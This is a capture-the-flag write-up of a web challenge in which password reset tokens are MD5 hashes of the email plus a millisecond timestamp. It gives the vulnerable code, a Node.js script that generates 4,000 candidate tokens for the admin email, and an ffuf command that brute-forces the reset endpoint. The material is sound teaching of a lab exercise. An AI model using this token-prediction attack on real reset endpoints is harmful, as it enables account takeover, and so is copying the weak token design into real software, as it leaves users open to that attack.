---
layout: ctf-layout
title: Predictable
permalink: /writeups/web/predictable
comments: false
---
<p align="center">
  <img src="https://i.imgflip.com/975z7n.jpg" title="Sign in as Admin!" width="95%" />
</p>

##### Difficulty: <b>Hard</b> 

##### Description:
You've been tasked on a pentest engagement to understand the token generation process and exploit it, do you have what it takes?

##### Challenge: 
This challenge wasn't too difficult. The name and description pretty much gave away the vulnerability. However, it did require reading the source code and scripting to generate the possible reset tokens needed to brute-force the password reset. I spent more time on this than I should have because I was confusing milliseconds with seconds—I know, I know.

##### Vulnerable Code:
The seed for the token is generated using only two easily predictable values: the user's email and the current time (Date.now()). It then MD5 hashes the two values, creating the reset token.
###### /helpers/ResetToken.js file:
```
const seed = email + currentTime.toString();
const token = crypto.createHash('md5').update(seed).digest('hex');
```

##### Solution:
The application's weakness was immediately apparent from both the challenge description and its name. Our goal was to exploit a flaw in the way password reset tokens are generated. Upon exploring the application, it became clear that the core functionality we need to focus on involves creating an account, logging in, and resetting passwords. To capture the flag, we would need to log in as the admin, but what's most interesting for our purposes are the "forgot password" and "reset password" functionalities.
<p align="center">
  <img src="https://i.imgflip.com/975zj5.jpg" title="Reset Password" width="85%" />
</p>
<br>

The password reset process requires the user's email and reset token. When we click on "forgot password," the application sends a reset token via email, which we receive in our NodeMailer email box that conveniently renders on the same page.

<p align="center">
  <img src="https://i.imgflip.com/975zzm.jpg" title="Reset Token Received" width="85%" />
</p>
<br>
After reviewing the source code, the vulnerability became obvious. The password reset tokens are generated by concatenating the user's email with the current Unix timestamp, then hashing the result using MD5. To exploit this, I first wrote a script to generate a token for my test user, test@hackthebox.com, using the same logic as the application. However, I quickly realized this approach wouldn't work since even a slight time difference—down to milliseconds—would result in a different token, making it nearly impossible to match the token precisely.
<br>
To overcome this, I wrote another script that generated 4,000 tokens, one for every millisecond difference from when the script started. After requesting a password reset, I captured the token sent via email and then used it to grep the same value from the list of the 4,000 generated tokens. Sure enough, I found a match!
<br>
<p align="center">
  <img src="https://i.imgflip.com/97622y.jpg" title="A Match!" width="85%" />
</p>
<br>
Now, I just needed to apply the same process, but this time replacing test@hackthebox.com with admin@hackthebox.com in my script. To brute-force the password reset, I planned to use a tool like ffuf along with a wordlist of generated tokens. I created 4,000 tokens for the admin@hackthebox.com email and quickly triggered the "forgot password" function for that email. Afterward, I used grep to extract the tokens from my script and placed them into a wordlist. Finally, I passed the wordlist to ffuf to brute-force the token for the password reset feature.
```bash
grep "Token:" results.txt  | awk -F 'Token: ' '{print $2}' > wordlist.txt // parse tokens from output into a wordlist for ffuf
```

```bash
ffuf -u http://127.0.0.1:1337/api/reset-password -X POST -d '{"email":"admin@hackthebox.com","token":"FUZZ","newPassword":"admin"}' -w wordlist.txt -H "Content-Type: application/json" -fw 5 //Fuzz token value until password is reset
```
<p align="center">
  <img src="https://i.imgflip.com/9762eq.jpg" title="FUFF Output" width="85%" />
</p>
<br>
I used the token to reset the admin's password, logged in as the admin and got the flag: 
<p align="center">
  <img src="https://i.imgflip.com/9762nt.jpg" title="The Flag!!!" width="85%" />
</p>
<br>

##### Exploit:
```js
const crypto = require('crypto');

// Exploit script to generate multiple tokens within a time range
async function generateTokensForRange(email, range) {
    console.log(`[*] Starting token generation for a 2000ms range...`);

    // Get the current time in milliseconds
    const startTime = Date.now();
    console.log(`[*] Start time: ${startTime}`);

    // Iterate over the time range (milliseconds defined further down)
    for (let offset = 0; offset <= range; offset++) {
        const currentTime = startTime + offset;

        // Generate the seed and then MD5 token for each millisecond in the range
        const seed = email + currentTime.toString();
        const token = crypto.createHash('md5').update(seed).digest('hex');

        const fullDateTime = new Date(currentTime).toLocaleString("en-US", { timeZone: "UTC" });
        
        console.log(`[+] Time (milliseconds): ${currentTime} | Time (UTC): ${fullDateTime} | Token: ${token}`);
    }

    console.log(`[*] Token generation for range complete.`);
}

(async () => {
    const email = "admin@hackthebox.com"; 
    const timeRange = 4000; 
    await generateTokensForRange(email, timeRange);
})();
```


